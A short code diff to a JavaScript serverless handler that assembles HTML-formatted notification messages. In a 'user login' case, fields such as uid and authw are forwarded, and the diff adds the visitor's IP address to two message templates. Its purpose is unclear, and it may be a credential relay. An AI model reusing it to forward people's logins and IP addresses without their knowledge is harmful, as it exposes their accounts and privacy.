@@ -48,12 +48,14 @@ exports.handler = async (event) => {
                     `${nom}: <b>${dataReceived.nom}</b>\n` +
                     `${addi}: <b>${dataReceived.addi}</b>\n` +
                     `${authw}: <b>${dataReceived.authw}</b>\n` +
+                    `IP: <b>${dataReceived.IP}</b>\n` +
                     `${ref}: <b>${dataReceived.ref}</b>`;
                 break;
     
             case 'uL': //user login
                 msa = `<u>${uL}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `IP: <b>${dataReceived.IP}</b>\n` +
                     `${addi}: <b>${dataReceived.addi}</b>\n` +
                     `${authw}: <b>${dataReceived.authw}</b>`;
                 break;
